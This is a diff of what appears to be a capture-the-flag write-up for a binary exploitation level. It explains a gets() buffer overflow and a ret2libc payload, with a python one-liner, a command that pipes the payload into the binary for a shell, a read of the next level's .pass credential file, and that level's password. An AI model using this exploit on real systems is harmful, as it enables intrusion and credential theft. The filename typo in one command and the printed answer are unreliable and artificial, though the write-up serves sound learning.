@@ -1,15 +1,29 @@
-# We use gdb, nm and strings on our kali to deeply analyze the target binary.
-# We found a reference to system syscall and a buffer.
-# We fulfill incrementally the buffer until an overflow is found.
-# We then craft our exploit, following the calling convention, with :
-#	- a string overflow
-#	- the address of the reference to "system" syscall
-#	- the address of the reference to "exit" syscall
-#	- the address of the string "/bin/sh"
+## Analysis
+
+The program calls gets(), which is a non-protected function against buffer overflow.
+
+`0x08048490 <+16>:    call   0x8048340 <gets@plt>`
+
+## Exploit
+
+Buffer overflow : we overwrite the return address so when the ret instruction ("0x08048496 <+22>") happens, it's our shellcode which is restored instead of the instruction flow of the caller.
+
+## Crafting
+
+0		     76			  80		    84		  88	
+[RANDOM_PADDING_STRING][SYSTEM INSTRUCTION][EXIT INSTRUCTION][SHELL STRING]
+			^
+			| RET instruction
+-------------------------
+
+We overflow the saved return address with the address of system call from the libc. 
+Followed by an exit instruction to mock x86 CALL instruction.
+Then a shell string to serve as system argument.
+
+## Shooting
 
 python -c 'print "A"*76 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x29\x88\x04\x08"' > /tmp/payload_level1
 cat /tmp/payaload_level1 - | ./level1
 
 cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
-
